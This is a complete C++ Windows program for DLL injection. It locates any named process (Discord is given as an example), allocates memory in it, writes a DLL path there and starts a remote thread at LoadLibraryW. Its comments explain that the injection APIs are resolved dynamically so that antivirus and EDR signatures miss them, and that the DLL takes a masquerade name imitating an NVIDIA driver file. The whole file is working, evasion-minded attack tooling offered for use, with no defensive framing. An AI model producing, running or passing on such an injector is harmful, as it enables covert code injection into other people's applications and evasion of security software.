#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <iostream>

#pragma comment(lib, "shell32.lib")

// Minimal injector. All injection APIs are resolved dynamically at runtime so
// the import table stays clean - a static CreateRemoteThread + WriteProcessMemory
// import combo is the single strongest AV/EDR signature an injector can carry.

typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HMODULE(WINAPI* fnLoadLibraryW)(LPCWSTR);

struct api_t {
    fnWriteProcessMemory WriteProcessMemory = nullptr;
    fnVirtualAllocEx VirtualAllocEx = nullptr;
    fnCreateRemoteThread CreateRemoteThread = nullptr;
    fnLoadLibraryW LoadLibraryW = nullptr;
};

static bool resolve(api_t& api) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return false;
    api.WriteProcessMemory = reinterpret_cast<fnWriteProcessMemory>(GetProcAddress(k32, "WriteProcessMemory"));
    api.VirtualAllocEx = reinterpret_cast<fnVirtualAllocEx>(GetProcAddress(k32, "VirtualAllocEx"));
    api.CreateRemoteThread = reinterpret_cast<fnCreateRemoteThread>(GetProcAddress(k32, "CreateRemoteThread"));
    api.LoadLibraryW = reinterpret_cast<fnLoadLibraryW>(GetProcAddress(k32, "LoadLibraryW"));
    return api.WriteProcessMemory && api.VirtualAllocEx && api.CreateRemoteThread && api.LoadLibraryW;
}

static DWORD find_pid(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main() {
    api_t api{};
    if (!resolve(api)) {
        std::cout << "failed to resolve injection APIs\n";
        std::cout << "\nPress Enter to close..."; std::cin.get();
        return 1;
    }

    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
    std::wstring dir(exe_path);
    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);

    // masquerade name
    std::wstring dll_path = dir + L"nvldumdx.dll";

    if (GetFileAttributesW(dll_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"nvldumdx.dll not found next to the injector:\n  " << dll_path << L"\n";
        std::wcout << L"Enter full path to nvldumdx.dll: ";
        std::wstring manual;
        std::getline(std::wcin, manual);
        if (manual.empty()) return 1;
        dll_path = manual;
        if (GetFileAttributesW(dll_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::wcout << L"File not found: " << dll_path << L"\n";
            return 1;
        }
    }

    const wchar_t* target_name = nullptr;
    DWORD pid = 0;

    // target any process: command line arg, or prompt (not tied to one app -
    // closing the host fully unloads the dll and releases the file)
    wchar_t target_buf[260] = L"";
    int argcw = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argcw);
    if (argv && argcw > 1 && argv[1][0] != L'\0') {
        wcsncpy_s(target_buf, argv[1], _TRUNCATE);
        target_name = target_buf;
        pid = find_pid(target_name);
    }
    else {
        std::wcout << L"Target process name (e.g. notepad.exe, discord.exe): ";
        std::wstring target_input;
        std::getline(std::wcin, target_input);
        // trim
        size_t start = target_input.find_first_not_of(L" \t");
        if (start == std::wstring::npos) {
            std::cout << "No target given.\n";
            std::cout << "\nPress Enter to close..."; std::cin.get();
            return 1;
        }
        size_t end = target_input.find_last_not_of(L" \t");
        target_input = target_input.substr(start, end - start + 1);
        if (target_input.find(L'.') == std::wstring::npos)
            target_input += L".exe";
        wcsncpy_s(target_buf, target_input.c_str(), _TRUNCATE);
        target_name = target_buf;
        pid = find_pid(target_name);
    }
    if (argv) LocalFree(argv);

    if (!pid) {
        std::wcout << L"Process not found: " << target_name << L" - launch it first.\n";
        std::cout << "\nPress Enter to close..."; std::cin.get();
        return 1;
    }
    std::wcout << L"Found " << target_name << L" (PID " << pid << L"), injecting " << dll_path << L"\n";

    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process) {
        std::cout << "OpenProcess failed (" << GetLastError() << ") - run as admin\n";
        std::cout << "\nPress Enter to close..."; std::cin.get();
        return 1;
    }

    SIZE_T size = (dll_path.size() + 1) * sizeof(wchar_t);
    LPVOID remote = api.VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        std::cout << "VirtualAllocEx failed\n";
        CloseHandle(process);
        return 1;
    }
    api.WriteProcessMemory(process, remote, dll_path.c_str(), size, nullptr);

    HANDLE thread = api.CreateRemoteThread(process, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(api.LoadLibraryW), remote, 0, nullptr);
    if (!thread) {
        std::cout << "CreateRemoteThread failed (" << GetLastError() << ")\n";
        CloseHandle(process);
        return 1;
    }
    WaitForSingleObject(thread, 10000);
    DWORD code = 0;
    GetExitCodeThread(thread, &code);
    if (code)
        std::cout << "Injected successfully (LoadLibrary returned 0x" << std::hex << code << std::dec << ")\n";
    else
        std::cout << "LoadLibrary returned 0 - check the dll path / dependencies / run as admin\n";

    CloseHandle(thread);
    CloseHandle(process);
    std::cout << "\nPress Enter to close..."; std::cin.get();
    return 0;
}
